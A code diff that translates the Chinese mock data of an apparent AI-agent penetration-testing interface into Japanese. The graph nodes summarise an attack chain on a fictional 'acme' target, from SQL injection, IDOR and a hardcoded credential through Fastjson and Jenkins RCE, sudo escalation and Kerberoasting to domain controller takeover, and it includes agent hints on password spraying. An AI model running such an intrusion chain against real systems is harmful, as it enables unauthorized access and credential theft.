     {
       id: "fi2",
       type: "finding",
-      payload: P({ summary: "SQL 注入（search q）可读 acme_prod 库" }),
+      payload: P({ summary: "SQL インジェクション（search の q）で acme_prod を読める" }),
       priority: 0,
       state: "confirmed",
       origin: "work#4",
@@ -1134,7 +1134,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi3",
       type: "finding",
-      payload: P({ summary: "IDOR：/v1/orders?id= 可越权读他人订单" }),
+      payload: P({ summary: "IDOR。/v1/orders?id= で権限を超えて他人の注文を読める" }),
       priority: 0,
       state: "confirmed",
       origin: "work#5",
@@ -1143,7 +1143,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiSrc",
       type: "finding",
-      payload: P({ summary: "源码泄露 + 硬编码数据库凭据（sa/Acme@2021）" }),
+      payload: P({ summary: "ソース漏えいと、ハードコードされたデータベース認証情報（sa/Acme@2021）" }),
       priority: 0,
       state: "confirmed",
       origin: "workG",
@@ -1152,7 +1152,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiRce",
       type: "finding",
-      payload: P({ summary: "shop Fastjson 反序列化 RCE，获得服务器命令执行" }),
+      payload: P({ summary: "shop の Fastjson デシリアライズ RCE。サーバーでコマンドを実行できる" }),
       priority: 0,
       state: "confirmed",
       origin: "work#7",
@@ -1161,7 +1161,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiPriv",
       type: "finding",
-      payload: P({ summary: "DMZ 立足点本地提权至 root（sudo NOPASSWD 错配）" }),
+      payload: P({ summary: "DMZ の足場でローカルから root へ権限昇格（sudo NOPASSWD の誤設定）" }),
       priority: 0,
       state: "confirmed",
       origin: "work#8",
@@ -1170,7 +1170,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiJenkins",
       type: "finding",
-      payload: P({ summary: "内部 Jenkins 未授权 Groovy → 服务器 RCE" }),
+      payload: P({ summary: "内部 Jenkins の未認可 Groovy からサーバー RCE" }),
       priority: 0,
       state: "confirmed",
       origin: "work#11",
@@ -1179,7 +1179,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiKerb",
       type: "finding",
-      payload: P({ summary: "Kerberoasting 破解域服务账号 svc_sql 口令" }),
+      payload: P({ summary: "Kerberoasting でドメインのサービスアカウント svc_sql のパスワードを解読した" }),
       priority: 0,
       state: "confirmed",
       origin: "work#12",
@@ -1188,18 +1188,18 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiDC",
       type: "finding",
-      payload: P({ summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成" }),
+      payload: P({ summary: "域コントローラー DC01 を掌握（Domain Admin）。内部の標的を達成" }),
       priority: 0,
       state: "confirmed",
       origin: "work#13",
       ts: T("2026-07-26T00:20:00Z"),
     },
 
-    // ── 提示（主 agent 注入）──
+    // ── ヒント（メイン agent が注入）──
     {
       id: "h1",
       type: "hint",
-      payload: P({ summary: "后台是 Element-UI，优先跑默认口令表" }),
+      payload: P({ summary: "管理画面は Element-UI。まず既定パスワード表を試す" }),
       priority: 5,
       state: "consumed",
       origin: "mainagent",
@@ -1208,7 +1208,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h2",
       type: "hint",
-      payload: P({ summary: "内网优先打 Jenkins：未授权 /script 直接 Groovy RCE" }),
+      payload: P({ summary: "内部では Jenkins を優先。未認可の /script でそのまま Groovy RCE" }),
       priority: 6,
       state: "consumed",
       origin: "mainagent",
@@ -1217,7 +1217,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h3",
       type: "hint",
-      payload: P({ summary: "源码里那组 DB 口令拿去内网喷洒，大概率通用" }),
+      payload: P({ summary: "ソースにあった DB パスワードを内部へスプレーする。共通である可能性が高い" }),
       priority: 6,
       state: "consumed",
       origin: "mainagent",
@@ -1225,12 +1225,12 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     },
   ],
   edges: [
-    // 根 → 目标
+    // 根 → 目標
     { src: "root", dst: "g1", rel: "spawns" },
     { src: "root", dst: "g2", rel: "spawns" },
     { src: "root", dst: "g3", rel: "spawns" },
     { src: "root", dst: "g4", rel: "spawns" },
-    // 目标 → 意图
+    // 目標 → インテント
     { src: "g1", dst: "i1", rel: "spawns" },
     { src: "g1", dst: "i2", rel: "spawns" },
     { src: "g1", dst: "i3", rel: "spawns" },
@@ -1245,7 +1245,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     { src: "g4", dst: "i11", rel: "spawns" },
     { src: "g4", dst: "i12", rel: "spawns" },
     { src: "g4", dst: "i13", rel: "spawns" },
-    // 意图 → 事实 / 漏洞（产出）
+    // インテント → 事実 / 脆弱性（産出）
     { src: "i1", dst: "fa1", rel: "yields" },
     { src: "i4", dst: "fa2", rel: "yields" },
     { src: "i2", dst: "fi1", rel: "yields" },
@@ -1267,7 +1267,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     { src: "i12", dst: "fa10", rel: "yields" },
     { src: "i12", dst: "fiKerb", rel: "yields" },
     { src: "i13", dst: "fiDC", rel: "yields" },
-    // 事实 → 新意图（事实驱动的多层递进）
+    // 事実 → 新しいインテント（事実が駆動する複数層の前進）
     { src: "fa3", dst: "i7", rel: "derived_from" },
     { src: "fa4", dst: "i8", rel: "derived_from" },
     { src: "fa4", dst: "i9", rel: "derived_from" },
@@ -1276,11 +1276,11 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     { src: "fa7", dst: "i12", rel: "derived_from" },
     { src: "fa9", dst: "i13", rel: "derived_from" },
     { src: "fa10", dst: "i13", rel: "derived_from" },
-    // 提示 → 意图
+    // ヒント → インテント
     { src: "h1", dst: "i2", rel: "derived_from" },
     { src: "h2", dst: "i11", rel: "derived_from" },
     { src: "h3", dst: "i10", rel: "derived_from" },
-    // 漏洞 → 证明目标达成
+    // 脆弱性 → 目標達成の証明
     { src: "fi1", dst: "g1", rel: "proves" },
     { src: "fiRce", dst: "g3", rel: "proves" },
     { src: "fiDC", dst: "g4", rel: "proves" },
@@ -1292,14 +1292,14 @@ export const frontier: TaskNode[] = explorationGraph.nodes.filter(
   (n) => n.type === "intent" && (n.state === "open" || n.state === "running"),
 );
 
-// ── Activity（执行过程）─────────────────────────────────────────────────────
-// 会话由 sessions-tab 从「意图」派生（session.id = intent.id），transcript = 匹配
-// intent_id 的活动流。planner=worker "planner"、主 agent=worker "mainagent"。
-// 每个 worker 会话含完整工具执行链（tool_use → tool_result → …→ result）。
+// ── Activity（実行過程）─────────────────────────────────────────────────────
+// セッションは sessions-tab が「インテント」から派生する（session.id = intent.id）。transcript は
+// intent_id が一致する活動流。planner=worker "planner"、メイン agent=worker "mainagent"。
+// 各 worker セッションは完全なツール実行連鎖を含む（tool_use → tool_result → …→ result）。
 export const activity: Activity[] = [
-  // planner —— 每轮完整决策链：读态势 → 拉 worker 产出对照 → 判目标 → add_intent 派方向
-  // ── 第 0 轮 · 目标拆解与首批意图（2026-07-24 09:12）──
-  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
+  // planner。毎ラウンドの完全な意思決定連鎖。態勢を読む → worker の産出を突き合わせる → 目標を判定する → add_intent で方向を出す
+  // ── 第 0 ラウンド · 目標の分解と最初のインテント（2026-07-24 09:12）──
+  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 ラウンド · 目標の分解" },
   {
     seq: 1001,
     worker: "planner",
